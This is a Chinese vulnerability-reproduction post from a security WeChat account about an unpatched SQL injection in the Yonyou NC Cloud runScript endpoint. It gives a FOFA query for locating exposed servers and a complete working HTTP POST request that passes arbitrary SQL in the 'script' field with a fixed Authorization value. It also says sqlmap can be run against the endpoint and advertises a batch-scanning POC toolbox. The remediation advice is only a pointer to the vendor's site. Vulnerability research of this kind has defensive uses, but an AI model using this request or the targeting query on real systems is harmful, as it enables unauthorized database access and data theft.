#  用友NC runScript接口存在SQL注入漏洞 附POC软件   
南风徐来  南风漏洞复现文库   2024-03-20 21:12  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 用友NC 简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
用友网络是全球领先的企业与公共组织软件、云服务、金融服务提供商。提供营销、制造、财务、人力等产品与服务，帮助客户实现发展目标，进而推动商业和社会进步。  
## 2.漏洞描述  
  
用友 NC Cloud，大型企业数字化平台， 聚焦数字化管理、数字化经营、数字化商业，帮助大型企业实现 人、财、物、客的全面数字化，从而驱动业务创新与管理变革，与企业管理者一起重新定义未来的高度。为客户提供面向大型企业集团、制造业、消费品、建筑、房地产、金融保险等14个行业大类，68个细分行业，涵盖数字营销、智能制造、财务共享、数字采购等18大解决方案，帮助企业全面落地数字化。用友NC runScript接口存在SQL注入漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
用友NC Cloud  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YxtuicqUetBuEeia9f8JJoL1Mib5siaucNb7cn980bSSFFaCb5l9FHIVT69o1Vztfu8P9vjUP3asgXNQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
用友NC runScript接口存在SQL注入漏洞  
## 4.fofa查询语句  
  
body="UClient.dmg"||app="用友-U8-Cloud"  
## 5.漏洞复现  
  
漏洞链接：http://127.0.0.1/ncchr/attendScript/internal/runScript  
  
漏洞数据包：  
```
POST /ncchr/attendScript/internal/runScript HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Accept-Language: en
Authorization: 58e00466213416018d01d15de83b0198
Content-Length: 59

key=1&script=select 1,111*111,user,4,5,6,7,8,9,10 from dual
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YxtuicqUetBuEeia9f8JJoL13Zx24Zf3bVJ99keWkfeCWC6Xf7icEDueGdYlbt9KrZP78GTgiaE2Eggg/640?wx_fmt=jpeg&from=appmsg "null")  
  
可以跑sqlmap  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YxtuicqUetBuEeia9f8JJoL1x8vK2Py8MckScuzOB21McYvOeliau92uCxAufAvXQ0ASJkbXCvsVBLg/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YxtuicqUetBuEeia9f8JJoL1H8axdVAAyVkibd5VHBmZ7BAnuZFFZ6DPd3o2tkl0OaTagkH6cWEvCHg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YxtuicqUetBuEeia9f8JJoL1hmh6qhuIZvZU22xMZyjUj4l66IUgB6D0ZLRp2icgukOusXo7ibFjNtHw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YxtuicqUetBuEeia9f8JJoL1mxlBOTwxrR7eBxcRvrMUicazHNuXbxGLoc54LKjTfdnqUYnDBhbTNaA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YxtuicqUetBuEeia9f8JJoL1eibLPpghticzmyDp6YicM63ibL59GCIZM8LuugnAHjcLLFJqG5OhOkjBdw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YxtuicqUetBuEeia9f8JJoL1tVSNcQFENLiaT1LEibFuEmRrKlNDOZZZZmMhia4f5drjiaOdQFcWQYibXYg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YxtuicqUetBuEeia9f8JJoL19u3XIKV6S8YQlFrADHvoOOicQlOaGZu01n6KiasqPhQSjXmia1zHZHFwA/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
厂商尚未提供漏洞修复方案，请关注厂商主页更新： https://www.yonyou.com/  
## 8.往期回顾  
  
[大华智慧园区综合管理平台clientServer存在SQL注入漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485829&idx=1&sn=16d23e7e11cc7cff1fbfd11f000a80f3&chksm=974b8482a03c0d94799dd4a06ef8ad5484b129844b8e68b2db2a538bdc0cb1c44bbc8e893659&scene=21#wechat_redirect)  
  
  
[泛微e-cology getE9DevelopAllNameValue2接口存在任意文件读取漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485795&idx=1&sn=15af77d340517e0f3d61519153b46e26&chksm=974b8464a03c0d721027afbca07d05e066d9f9c2e4be1d4f9a2a779fbfcbe7c3e6921db37c71&scene=21#wechat_redirect)  
  
  
  
  
